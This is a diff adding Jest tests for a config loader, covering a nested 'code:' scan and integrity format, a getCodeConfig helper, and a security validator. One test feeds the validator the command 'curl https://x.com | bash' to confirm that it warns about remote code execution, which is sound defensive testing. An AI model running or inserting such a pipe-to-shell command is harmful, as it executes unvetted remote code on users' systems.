@@ -4,6 +4,7 @@ import {
   findConfigPath,
   validateScanCommand,
   validateConfigSecurity,
+  getCodeConfig,
 } from "../config/loader.js";
 import { writeFileSync, mkdirSync, rmSync } from "fs";
 import { join } from "path";
@@ -168,5 +169,105 @@ describe("validateConfigSecurity", () => {
       ],
     });
     expect(warnings.length).toBeGreaterThanOrEqual(2);
+  });
+
+  it("should check scans in nested code: format", () => {
+    const warnings = validateConfigSecurity({
+      code: {
+        scans: [{ name: "dangerous", command: "curl https://x.com | bash" }],
+      },
+    });
+    expect(warnings.length).toBe(1);
+    expect(warnings[0]).toContain("[code.dangerous]");
+    expect(warnings[0]).toContain("executes remote code");
+  });
+});
+
+describe("nested config format", () => {
+  const testDir = join(tmpdir(), "drift-nested-test-" + Date.now());
+
+  beforeAll(() => {
+    mkdirSync(testDir, { recursive: true });
+  });
+
+  afterAll(() => {
+    rmSync(testDir, { recursive: true, force: true });
+  });
+
+  it("should parse nested code: config format", () => {
+    const configPath = join(testDir, "drift.config.yaml");
+    const yaml = `
+code:
+  scans:
+    - name: test-scan
+      command: echo hello
+      severity: high
+  integrity:
+    protected:
+      - file: README.md
+        approved: approved/README.md
+        severity: critical
+`;
+    writeFileSync(configPath, yaml);
+
+    const config = loadConfig(testDir);
+    expect(config).not.toBeNull();
+    expect(config?.code?.scans).toHaveLength(1);
+    expect(config?.code?.scans?.[0].name).toBe("test-scan");
+    expect(config?.code?.integrity?.protected).toHaveLength(1);
+    expect(config?.code?.integrity?.protected?.[0].file).toBe("README.md");
+  });
+});
+
+describe("getCodeConfig", () => {
+  it("should return code config from nested format", () => {
+    const config = {
+      code: {
+        scans: [{ name: "test", command: "echo test" }],
+        integrity: {
+          protected: [
+            { file: "test.txt", approved: "approved/test.txt", severity: "high" as const },
+          ],
+        },
+      },
+    };
+
+    const codeConfig = getCodeConfig(config);
+    expect(codeConfig).not.toBeNull();
+    expect(codeConfig?.scans).toHaveLength(1);
+    expect(codeConfig?.scans?.[0].name).toBe("test");
+  });
+
+  it("should return code config from legacy flat format", () => {
+    const config = {
+      scans: [{ name: "test", command: "echo test" }],
+      integrity: {
+        protected: [
+          { file: "test.txt", approved: "approved/test.txt", severity: "high" as const },
+        ],
+      },
+    };
+
+    const codeConfig = getCodeConfig(config);
+    expect(codeConfig).not.toBeNull();
+    expect(codeConfig?.scans).toHaveLength(1);
+    expect(codeConfig?.integrity?.protected).toHaveLength(1);
+  });
+
+  it("should prefer nested format over flat format", () => {
+    const config = {
+      scans: [{ name: "flat", command: "echo flat" }],
+      code: {
+        scans: [{ name: "nested", command: "echo nested" }],
+      },
+    };
+
+    const codeConfig = getCodeConfig(config);
+    expect(codeConfig?.scans?.[0].name).toBe("nested");
+  });
+
+  it("should return null for empty config", () => {
+    const codeConfig = getCodeConfig({});
+    expect(codeConfig).toBeNull();
   });
 });
